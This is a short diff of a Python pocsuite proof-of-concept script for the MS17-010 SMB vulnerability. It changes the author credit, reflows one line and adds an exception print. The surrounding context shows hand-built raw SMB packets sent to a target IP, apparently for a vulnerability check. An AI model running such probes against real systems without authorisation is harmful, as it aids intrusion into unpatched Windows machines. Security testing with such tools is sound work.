@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# @Author  : yds
+# @Author  : TideSec
 # @Time    : 2018/04/19
 # @File    : _170605_SMB_ms17_010_RCE.py
 # @Desc    : ""
@@ -14,7 +14,7 @@ from pocsuite.api.poc import Output, POCBase
 class TestPOC(POCBase):
     vulID = '00005'
     version = '1'
-    author = 'yds'
+    author = 'TideSec'
     vulDate = '2017-05-12'
     createDate = '2018-04-19'
     updateDate = '2018-04-19'
@@ -54,8 +54,7 @@ class TestPOC(POCBase):
             data = s.recv(1024)
             user_id = data[32:34]
             tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff00" \
-                                        "0000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % (
-            (58 + len(target_ip)), user_id.encode('hex'), target_ip.encode('hex'))
+                                        "0000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(target_ip)), user_id.encode('hex'), target_ip.encode('hex'))
             s.send(binascii.unhexlify(tree_connect_andx_request))
             data = s.recv(1024)
             all_id = data[28:36]
@@ -70,6 +69,7 @@ class TestPOC(POCBase):
                 result['VerifyInfo']['Payload'] = payload[:20]
                 result['VerifyInfo']['result'] = data[:20]
         except Exception as e:
+            print e
             pass
         return self.parse_attack(result)
 
